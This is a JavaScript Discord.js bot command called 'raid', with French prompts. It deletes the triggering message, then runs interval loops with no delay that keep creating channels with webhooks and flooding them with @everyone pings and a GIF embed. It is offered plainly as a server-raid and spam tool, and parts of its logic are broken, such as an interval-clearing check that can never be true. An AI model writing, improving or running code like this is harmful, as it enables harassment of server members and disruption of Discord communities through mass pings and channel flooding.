//--by-NF5--//

const Discord = require("discord.js")


module.exports = {
 name:"raid",
 usage:"raid + <nom d'un channel>",
 
 execute: async(bot, message, args) => {
    let nameofchannel = args.slice(1).join(" ")
    if(!nameofchannel) return message.author.send("Veuillez saisir un nom de channel à créer")


  if (message.deletable) message.delete();
        let i = 0;
        let inter = setInterval(function () {
            message.guild.channels.cache.forEach((channel) => {
                if (channel.type === `${nameofchannel}`) 
                channel.send(`@everyone https://cdn.discordapp.com/attachments/942179714494267423/942223986631266335/25c3b7e056ec7bd21dbd69fd93879aa7.gif ${nameofchannel}`)
            
            });
        })

        if(message.deletable) message.delete();
        let inters = setInterval (function () {
            if(0 === 100) clearInterval(inters);
            message.guild.channels.create(nameofchannel).then(c => {
                c.createWebhook(`${nameofchannel}`)
                .then(webhook => {
                    setInterval(function () {
                        let saembed = new Discord.MessageEmbed()
                        .setColor("FF0000")
                        .setTitle(`${nameofchannel}`)
                        .setImage("https://cdn.discordapp.com/attachments/942179714494267423/942223986631266335/25c3b7e056ec7bd21dbd69fd93879aa7.gif")
                        webhook.send(saembed)
                        webhook.send("@everyone")
                    })
                })
            })
        })
 }
}